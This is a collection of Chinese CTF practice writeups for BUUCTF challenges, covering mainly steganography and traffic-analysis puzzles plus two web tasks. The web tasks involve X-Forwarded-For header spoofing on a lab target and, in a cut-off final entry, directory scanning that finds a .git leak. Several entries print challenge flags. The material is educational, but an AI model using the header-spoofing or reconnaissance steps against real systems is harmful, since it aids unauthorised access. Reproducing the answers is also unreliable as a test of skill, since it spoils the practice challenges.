<p>这里提供一个在线网站<a class="link"   href="https://lzltool.cn/hextoimage" >十六进制转图片 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240923185513305.png"
                      alt="image-20240923185513305"
                ></p>
<p>这就是密码了！！！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/webshell%E6%B7%B7%E6%B7%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240923195348685.png"
                      alt="image-20240923195348685"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/webshell%E6%B7%B7%E6%B7%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/image-20240923195355103.png"
                      alt="image-20240923195355103"
                ></p>
<p><code>flag&#123;3OpWdJ-JP6FzK-koCMAK-VkfWBq-75Un2z&#125;</code></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个题是真有点难度了对新手来说（我也是新手），对于刚开始了解网络分析的人来说更是重量级的，建议亲自上手感受一下层层嵌套的感觉，总的来说这道题就是一个找压缩包找密码的，多熟悉熟悉数据报会好做很多</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B9%9D%E7%AB%A0][9.3.2%20webshell%E6%B7%B7%E6%B7%86%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90]webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>流量分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Word文档隐写-隐藏文字</title>
    <url>/2024/09/20/ctf/writeup/misc/buuctf/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E9%9A%90%E8%97%8F%E6%96%87%E5%AD%97/</url>
    <content><![CDATA[<h1 id="Word文档隐写-隐藏文字"><a href="#Word文档隐写-隐藏文字" class="headerlink" title="[Word文档隐写]隐藏文字"></a>[Word文档隐写]隐藏文字</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个word的附件，另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E5%AD%97%E4%BD%93%E9%A2%9C%E8%89%B2/image-20240920183308520.png"
                      alt="image-20240920183308520"
                ></p>
<p>打开文档，发现是空白的，根据题目是有关隐藏文字隐写，直接全选文字，取消整体隐藏文字</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E9%9A%90%E8%97%8F%E6%96%87%E5%AD%97/image-20240921001717304.png"
                      alt="image-20240921001717304"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E9%9A%90%E8%97%8F%E6%96%87%E5%AD%97/image-20240921001847756.png"
                      alt="image-20240921001847756"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E9%9A%90%E8%97%8F%E6%96%87%E5%AD%97/image-20240921001809037.png"
                      alt="image-20240921001809037"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BWord%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99%5D%E9%9A%90%E8%97%8F%E6%96%87%E5%AD%97/image-20240921001858168.png"
                      alt="image-20240921001858168"
                ></p>
<p>可以看到很简单就拿到了flag</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>又是一篇小水文~ε٩(๑&gt; ₃ &lt;)۶з</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.5.1%20Word%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99]%E9%9A%90%E8%97%8F%E6%96%87%E5%AD%97" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>图种</title>
    <url>/2024/09/18/ctf/writeup/misc/buuctf/%E5%9B%BE%E7%A7%8D/</url>
    <content><![CDATA[<h1 id="图种"><a href="#图种" class="headerlink" title="图种"></a>图种</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个图片的附件，将图片另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E9%99%84%E5%8A%A0%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240918234722257.png"
                      alt="image-20240918234722257"
                ></p>
<p>由于是misc类，根据题目使用数据分离工具<a class="link"   href="https://github.com/ReFirmLabs/binwalk" >Binwalk <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>（kali）</p>
<blockquote>
<p>需要加上 –run-as&#x3D;root 给权限</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E5%9B%BE%E7%A7%8D/image-20240919000345254.png"
                      alt="image-20240919000345254"
                ></p>
<p>图中可以看到有我们的flag文件，直接到生成的文件夹找到并打开文件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E5%9B%BE%E7%A7%8D/image-20240919000651144.png"
                      alt="image-20240919000651144"
                ></p>
<p>恭喜，你找到了flag！</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是一道多文件包含为图片格式的图种隐写，后续肯定会结合着考，所以也要重视这些简单的</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.2.1%20%E9%99%84%E5%8A%A0%E5%AD%97%E7%AC%A6%E4%B8%B2]%E5%9B%BE%E7%A7%8D" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>波形图</title>
    <url>/2024/09/19/ctf/writeup/misc/buuctf/%E6%B3%A2%E5%BD%A2%E5%9B%BE/</url>
    <content><![CDATA[<h1 id="波形图"><a href="#波形图" class="headerlink" title="波形图"></a>波形图</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个音频的附件，另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E6%B3%A2%E5%BD%A2%E5%9B%BE/image-20240920011449684.png"
                      alt="image-20240920011449684"
                ></p>
<p>用<a class="link"   href="https://www.audacityteam.org/post-download/" >Audacity <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>将其打开，对于波形图的题来说一般隐藏文件会存在开端或者结尾，不然选手很难找到</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E6%B3%A2%E5%BD%A2%E5%9B%BE/image-20240920011609290.png"
                      alt="image-20240920011609290"
                ></p>
<p>隐藏文件在最最最前面，放大去看看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E6%B3%A2%E5%BD%A2%E5%9B%BE/image-20240920011701066.png"
                      alt="image-20240920011701066"
                ></p>
<p>根据这段奇怪的波形图，将正值写为1，负值写为0，会得到一串二进制码，再用脚本将其转换为ASCII码即可得到flag</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">s=<span class="string">&#x27;110011011011001100001110011111110111010111011000010101110101010110011011101011101110110111011110011111101&#x27;</span></span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s),<span class="number">7</span>):</span><br><span class="line">    res+=<span class="built_in">chr</span>(<span class="built_in">int</span>(s[i:i+<span class="number">7</span>],<span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># flag&#123;W0W*funny&#125;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这类音频的题型要合理根据题目来做题，多练多熟悉</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.3.3%20%E6%B3%A2%E5%BD%A2%E5%9B%BE]04" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>盲水印</title>
    <url>/2024/09/19/ctf/writeup/misc/buuctf/%E7%9B%B2%E6%B0%B4%E5%8D%B0/</url>
    <content><![CDATA[<h1 id="盲水印"><a href="#盲水印" class="headerlink" title="盲水印"></a>盲水印</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个压缩包的附件，另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E7%9B%B2%E6%B0%B4%E5%8D%B0/image-20240919190149795.png"
                      alt="image-20240919190149795"
                ></p>
<p>压缩包会给两个图片，一看blind2就大一点，也就是有盲水印在里面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E7%9B%B2%E6%B0%B4%E5%8D%B0/image-20240919190321553.png"
                      alt="image-20240919190321553"
                ></p>
<p>用工具进行还原<a class="link"   href="https://github.com/chishaxie/BlindWaterMark" >BlindWatermark <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>不要去github搜索下成<a class="link"   href="https://github.com/fire-keeper/BlindWatermark" >BlindWatermark <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>了，这个是新的，需要看redeme的参数，本案例用的是上面的提供的</p>
</blockquote>

  <div class="note p-4 mb-4 rounded-small red">
    <p>我真的服这本书了，已经第几次因为提供的案例和工具对不上和浪费了很多时间，真的是作者就不能把工具给完吗，每次试错都搞得我头大（╬￣皿￣） </p>

  </div>

<p>参考系数</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>yuantu.png</td>
<td>原来的没有水印的图片</td>
</tr>
<tr>
<td>shuiyintu.png</td>
<td>有水印的图片</td>
</tr>
<tr>
<td>result_1.png</td>
<td>合成的有水印的图片</td>
</tr>
<tr>
<td>result_2.png</td>
<td>提取的水印图片</td>
</tr>
</tbody></table>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 合成盲水印</span></span><br><span class="line">python2 bwm.py encode yuantu.png shuiyintu.png result_1.png</span><br><span class="line"><span class="comment"># 提取盲水印</span></span><br><span class="line">python2 bwm.py encode yuantu.png result_1.png result_2.png</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合成盲水印</span></span><br><span class="line">python3 bwmforpy3.py encode yuantu.png shuiyintu.png result_1.png</span><br><span class="line"><span class="comment"># 提取盲水印</span></span><br><span class="line">python3 bwmforpy3.py encode yuantu.png result_1.png result_2.png</span><br></pre></td></tr></table></figure></div>

<p>在windows系统用py3进行提取</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 bwmforpy3.py encode blind1.png blind2.png result.png</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919185229567.png"
                      alt="image-20240919185229567"
                ></p>
<p>看到成功提取出来了flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919185257272.png"
                      alt="image-20240919185257272"
                ></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当一个工具出现了大量和书本或者参考不同的错误的时候，要注意是不是工具找错了</p>
<blockquote>
<p>再吐槽一次，我真的是找个工具都要这么费力，服了山(≧皿≦)山 </p>
</blockquote>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.2.4%20%E7%9B%B2%E6%B0%B4%E5%8D%B0]%E7%9B%B2%E6%B0%B4%E5%8D%B0" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>最低有效位（LSB）</title>
    <url>/2024/09/19/ctf/writeup/misc/buuctf/%E6%9C%80%E4%BD%8E%E6%9C%89%E6%95%88%E4%BD%8D%EF%BC%88LSB%EF%BC%89/</url>
    <content><![CDATA[<h1 id="最低有效位（LSB）"><a href="#最低有效位（LSB）" class="headerlink" title="最低有效位（LSB）"></a>最低有效位（LSB）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个图片的附件，将图片另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E6%9C%80%E4%BD%8E%E6%9C%89%E6%95%88%E4%BD%8D%EF%BC%88LSB%EF%BC%89/image-20240918234722257.png"
                      alt="image-20240918234722257"
                ></p>
<p>根据题目LSB隐写，使用工具<a class="link"   href="https://github.com/Giotino/stegsolve/tree/v.1.5" >stegsolve <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>对其进行提取</p>
<blockquote>
<p>工具需要java环境</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919174523222.png"
                      alt="image-20240919174523222"
                ></p>
<p>通过各种尝试，导出最后的文件，拿到flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E6%9C%80%E4%BD%8E%E6%9C%89%E6%95%88%E4%BD%8D%EF%BC%88LSB%EF%BC%89/image-20240919175550151.png"
                      alt="image-20240919175550151"
                ></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>隐写题根据题目用工具多次尝试即可，主要在于实操</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.2.3%20%E6%9C%80%E4%BD%8E%E6%9C%89%E6%95%88%E4%BD%8DLSB]lsb" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>莫尔斯电码</title>
    <url>/2024/09/19/ctf/writeup/misc/buuctf/%E8%8E%AB%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81/</url>
    <content><![CDATA[<h1 id="莫尔斯电码"><a href="#莫尔斯电码" class="headerlink" title="莫尔斯电码"></a>莫尔斯电码</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个音频的附件，另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E8%8E%AB%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81/image-20240919195612187.png"
                      alt="image-20240919195612187"
                ></p>
<p>试听一下能发现是滴答的感觉，那就可以从莫斯密码入手了</p>
<p>使用工具<a class="link"   href="https://www.audacityteam.org/post-download/" >Audacity <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>看音频长短，再对照摩斯密码进行还原</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E9%9A%90%E5%86%99%E6%9C%AF/image-20240919195226161.png"
                      alt="image-20240919195226161"
                ></p>
<p>整个的提取出来是</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">..-.  .-..  .-  --. </span><br><span class="line">..  ... </span><br><span class="line">.-  ..  .-.  .-.  ..-  -..  -.. .  .-. </span><br><span class="line">--  ---  .-.  ...  . </span><br><span class="line">-.-.  ---  -..  .</span><br></pre></td></tr></table></figure></div>

<p>用<a class="link"   href="https://www.lddgo.net/encrypt/morse" >在线解码 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>可以就得到flag了，<code>flag is airrudder morrse code</code></p>

  <div class="note p-4 mb-4 rounded-small warning">
    <p>这里提交不了平台，不知道什么原因，平台显示的提交人数也为0</p>

  </div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E8%8E%AB%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81/image-20240919201706146.png"
                      alt="image-20240919201706146"
                ></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于摩尔斯电码，一般不会有这种题，因为没有技术含量还浪费时间，留个印象就行</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.3.1%20%E6%91%A9%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81%E4%B8%8E%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99]%E8%8E%AB%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>附加字符串</title>
    <url>/2024/09/18/ctf/writeup/misc/buuctf/%E9%99%84%E5%8A%A0%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<h1 id="附加字符串"><a href="#附加字符串" class="headerlink" title="附加字符串"></a>附加字符串</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个图片的附件，将图片另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E9%99%84%E5%8A%A0%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240918234722257.png"
                      alt="image-20240918234722257"
                ></p>
<p>由于是misc类，根据题目猜测是图片隐写，用<a class="link"   href="https://www.52pojie.cn/thread-1863194-1-1.html" >010Editor <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>打开看看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E9%99%84%E5%8A%A0%E5%AD%97%E7%AC%A6%E4%B8%B2/image-20240918234824530.png"
                      alt="image-20240918234824530"
                ></p>
<p>搜索<code>flag</code>，果然被隐藏了</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这是一道基础的图片隐写题目，没有太多可说的</p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.2.1%20%E9%99%84%E5%8A%A0%E5%AD%97%E7%AC%A6%E4%B8%B2]%E9%99%84%E5%8A%A0%E5%AD%97%E7%AC%A6%E4%B8%B2" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>频谱图</title>
    <url>/2024/09/19/ctf/writeup/misc/buuctf/%E9%A2%91%E8%B0%B1%E5%9B%BE/</url>
    <content><![CDATA[<h1 id="频谱图"><a href="#频谱图" class="headerlink" title="频谱图"></a>频谱图</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，会给一个音频的附件，另存为下来</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E6%B3%A2%E5%BD%A2%E5%9B%BE/image-20240920011449684.png"
                      alt="image-20240920011449684"
                ></p>
<p>用<a class="link"   href="https://www.audacityteam.org/post-download/" >Audacity <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>将其打开，对于频谱图的题来说可以随手打开频谱图看看，万一就是呢</p>
<blockquote>
<p>只需要用手点点就能发现意想不到的东西，岂不美哉≖‿≖✧ </p>
</blockquote>
<p>音频是一段杂音或者比较刺耳，波形图也没有规律，则可能是频谱图隐写</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E9%A2%91%E8%B0%B1%E5%9B%BE/image-20240920012648185.png"
                      alt="image-20240920012648185"
                ></p>
<p>波形图不连续也没有规律，用频谱图看看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E9%A2%91%E8%B0%B1%E5%9B%BE/image-20240920012732399.png"
                      alt="image-20240920012732399"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%E9%A2%91%E8%B0%B1%E5%9B%BE/image-20240920012745555.png"
                      alt="image-20240920012745555"
                ></p>
<p>直接就得到flag了</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于频谱图，可以作为一个日常判断来做题，拿到音频题就直接看一下频谱图，不是就不管，是的话不就成了嘛，当然还是先试听一下，一般来说不会给这么明显简单的题目 </p>
<p><a class="link"   href="https://buuoj.cn/challenges#[%E7%AC%AC%E4%B8%83%E7%AB%A0][7.3.4%20%E9%A2%91%E8%B0%B1%E5%9B%BE]hear_with_your_eyes" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>misc</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>隐写术</tag>
      </tags>
  </entry>
  <entry>
    <title>BUU BURP COURSE 1</title>
    <url>/2024/09/12/ctf/writeup/web/buuctf/BUU-BURP-COURSE-1/</url>
    <content><![CDATA[<h1 id="BUU-BURP-COURSE-1"><a href="#BUU-BURP-COURSE-1" class="headerlink" title="BUU BURP COURSE 1"></a>BUU BURP COURSE 1</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>开启靶场后，只有一行文字，查看F12也没有东西，我们就抓包来看看，这里用的BP</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/BUU-BURP-COURSE-1/image-20240912212137491.png"
                      alt="image-20240912212137491"
                ></p>
<p>尝试使用<code>X-Forwarded-For</code>或者<code>X-Client</code>改包，返回这样的页面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/BUU-BURP-COURSE-1/image-20240912212428190.png"
                      alt="image-20240912212428190"
                ></p>
<p>查看网页源码可以看到密码，但其实没有什么用</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/BUU-BURP-COURSE-1/image-20240912212506652.png"
                      alt="image-20240912212506652"
                ></p>
<p>我们直接点击登录继续抓包，加上上一步的伪造本地请求，即可得到flag</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/BUU-BURP-COURSE-1/image-20240912212702328.png"
                      alt="image-20240912212702328"
                ></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>新手试水题，水~</p>
<p><a class="link"   href="https://buuoj.cn/challenges#BUU%20BURP%20COURSE%201" >题目在这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>ctf</category>
        <category>writeup</category>
        <category>web-writeup</category>
        <category>buuctf</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020-Mark-loves-cat*</title>
    <url>/2024/09/13/ctf/writeup/web/buuctf/%5BBJDCTF2020%5DMark-loves-cat/</url>
    <content><![CDATA[<h1 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat*"></a>[BJDCTF2020]Mark loves cat*</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>出自<a class="link"   href="https://buuoj.cn/" >BUUCTF <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>练习场，也有相关的配套课本（我看的是《CTF实战 从入门到提升》，感觉还行，但有不少细节感觉还是得查资料才能懂）</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>打开靶场，可以看到一个前段页面</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DMark-loves-cat/image-20240914162948928.png"
                      alt="image-20240914162948928"
                ></p>
<p>上下翻找在页面上并没有什么提示和能入手的，那就做一下目录扫描等信息收集，这里我用的<a class="link"   href="https://github.com/maurosoria/dirsearch" >dirsearch <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，我新建了一个示例文件存放扫描目录，正常情况扫描需要花好些时间</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../../../../images/%5BBJDCTF2020%5DMark-loves-cat/image-20240914172851299.png"
                      alt="image-20240914172851299"
                ></p>
<p>如图可以看到可能存在.git信息泄露</p>
